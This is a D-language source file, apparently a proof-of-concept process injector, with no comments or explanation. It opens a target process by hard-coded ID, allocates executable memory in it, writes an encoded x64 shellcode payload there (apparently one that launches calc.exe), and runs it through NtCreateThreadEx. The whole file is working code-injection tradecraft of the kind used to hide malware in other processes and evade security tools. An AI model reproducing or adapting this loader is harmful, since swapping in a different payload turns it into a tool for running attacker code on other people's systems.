import std.stdio;
import core.sys.windows.windows;

alias NTSTATUS = uint;

enum STATUS_SUCCESS = NTSTATUS(0x00000000);
enum STATUS_UNSUCCESSFUL = NTSTATUS(0xC0000001);

pragma(lib, "ntdll.lib");

struct UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
};

struct OBJECT_ATTRIBUTES {
  ULONG           Length;
  HANDLE          RootDirectory;
  UNICODE_STRING* ObjectName;
  ULONG           Attributes;
  PVOID           SecurityDescriptor;
  PVOID           SecurityQualityOfService;
};

struct CLIENT_ID {
    HANDLE UniqueProcessId;
    HANDLE UniqueThreadId;
}

extern (Windows) NTSTATUS NtOpenProcess(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    OBJECT_ATTRIBUTES* ObjectAttributes,
    CLIENT_ID* ClientId
);

extern (Windows) NTSTATUS NtCreateThreadEx(
  PHANDLE hThread,
  ACCESS_MASK DesiredAccess,
  PVOID ObjectAttributes,
  HANDLE ProcessHandle,
  PVOID lpStartAddress,
  PVOID lpParameter,
  ULONG Flags,
  SIZE_T StackZeroBits,
  SIZE_T SizeOfStackCommit,
  SIZE_T SizeOfStackReserve,
  PVOID lpBytesBuffer
);

extern (Windows) NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

extern (Windows) NTSTATUS NtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

void main() {
    const(char)[] payload =  "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b" ~
                      "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2" ~
                      "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b" ~
                      "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04" ~
                      "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0" ~
                      "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2" ~
                      "\x48\x83\xec\x20\x41\xff\xd6";

    HANDLE hProcess;
    HANDLE threadHandle;
    uint processId = 14992;
    
    CLIENT_ID cId;
    cId.UniqueProcessId = cast(HANDLE)processId;
    cId.UniqueThreadId = cast(HANDLE)0;
    OBJECT_ATTRIBUTES objAttr = { 0 };
    NTSTATUS status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cId);
    if (status == STATUS_SUCCESS) {
        writefln("[0x%x] got a handle on process (%d)!", hProcess, processId);
    } else {
        writeln("failed to open process.");
    }

    PVOID baseAddress = null;
    SIZE_T regionSize = payload.length;

    status = NtAllocateVirtualMemory(hProcess, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status == STATUS_SUCCESS) {
        writefln("[0x%x] allocated a %d buffer with PAGE_EXECUTE_READWRITE ", baseAddress, regionSize);
    } else {
        writeln("failed to allocate virtual memory.");
    }

    SIZE_T bytesWritten;
    status = NtWriteVirtualMemory(hProcess, baseAddress, cast(PVOID)&payload[0], cast(SIZE_T)payload.length, &bytesWritten);
    if (status == STATUS_SUCCESS) {
        writefln("[0x%x] wrote %d bytes to the allocated buffer! ", cast(char*)baseAddress, bytesWritten);
    } else {
        writeln("failed to write memory.");
    }

    status = NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, null, hProcess, baseAddress, null, false, 0, 0, 0, null);
    if (status == STATUS_UNSUCCESSFUL) {
        writeln("failed to create thread.");
    }
    writefln("[0x%x] successfully created thread!", threadHandle);
    writefln("[0x%x] waiting for thread to finish execution..", threadHandle);
}
